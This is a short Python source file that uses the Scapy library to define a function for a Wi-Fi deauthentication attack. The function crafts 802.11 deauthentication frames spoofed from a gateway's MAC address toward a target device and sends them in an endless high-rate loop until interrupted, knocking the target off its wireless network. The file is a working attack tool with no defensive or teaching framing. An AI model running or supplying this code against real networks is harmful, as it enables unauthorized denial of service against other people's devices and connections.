from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import logging


def deauthentication_attack(target_mac, gateway_mac, iface="wlan0"):
    """
    Performs a deauthentication attack against a target device.

    Args:
        target_mac: The MAC address of the target device.
        gateway_mac: The MAC address of the gateway.
        iface: The wireless interface to use for the attack.
    """
    logging.info("[*] Performing deauthentication attack...")
    logging.info(f"[*] Target: {target_mac}")
    logging.info(f"[*] Gateway: {gateway_mac}")
    logging.info(f"[*] Interface: {iface}")
    logging.warning(
        "[!] Note: This feature requires root access and a wireless card that"
        " supports monitor mode."
    )

    try:
        # Craft the deauthentication packet
        packet = (
            RadioTap()
            / Dot11(
                type=0,
                subtype=12,
                addr1=target_mac,
                addr2=gateway_mac,
                addr3=gateway_mac,
            )
            / Dot11Deauth(reason=7)
        )

        # Send the packet in a loop
        while True:
            sendp(packet, iface=iface, count=100, inter=0.001, verbose=0)
    except KeyboardInterrupt:
        logging.info("\n[*] Deauthentication attack stopped.")
    except Exception as e:
        logging.error(f"Error during deauthentication attack: {e}")
